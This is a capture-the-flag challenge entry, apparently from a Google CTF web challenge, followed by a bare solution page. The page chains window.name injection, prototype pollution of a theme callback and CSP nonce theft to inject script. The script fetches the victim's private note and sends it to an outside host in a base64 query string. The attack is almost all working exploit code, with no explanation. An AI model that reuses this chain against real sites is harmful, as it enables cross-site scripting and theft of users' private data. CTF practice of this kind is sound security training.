ALL THE LITTLE THINGS
298pt
web icon
I left a little secret in a note, but it's private, private is safe.

Note: TJMike🎤 from Pasteurize is also logged into the page.

https://littlethings.web.ctfcompetition.com
Solved by (20):



##Solution


```
<!DOCTYPE html>
<html>
<head>

	<script>
x= `
	<iframe name=x title='fetch(&#x22;/note&#x22;).then(x=>x.text()).then(x=>top.location=&#x22;//ctf.s1r1us.ninja?html=&#x22;+btoa(encodeURIComponent(x)))' id=y srcdoc='<script><\/script>'></iframe>
	<iframe srcdoc='<script src=https://littlethings.web.ctfcompetition.com/theme?cb=top.x.nonce=top.document.body.lastElementChild.firstElementChild.nextElementSibling.nextElementSibling.nextElementSibling.nonce.valueOf ><\/script>'></iframe>
	<iframe srcdoc='<script src=https://littlethings.web.ctfcompetition.com/theme?cb=top.x.document.head.lastElementChild.nonce=top.x.nonce.valueOf ><\/script>'></iframe>
	<iframe srcdoc='<script src=https://littlethings.web.ctfcompetition.com/theme?cb=top.x.document.head.lastElementChild.innerHTML=top.y.title.valueOf ><\/script>'></iframe>
`;
		window.name = `{"x": ${JSON.stringify(x)}, "verbose": true, "showAll": true, "keepDebug": true, "__proto__": {"theme":{"cb":"document.body.lastElementChild.previousElementSibling.innerHTML=window.name.valueOf"}}}`;
location = 'https://littlethings.web.ctfcompetition.com/settings?__debug__';

	</script>
<body>
  </body>
</html>

```
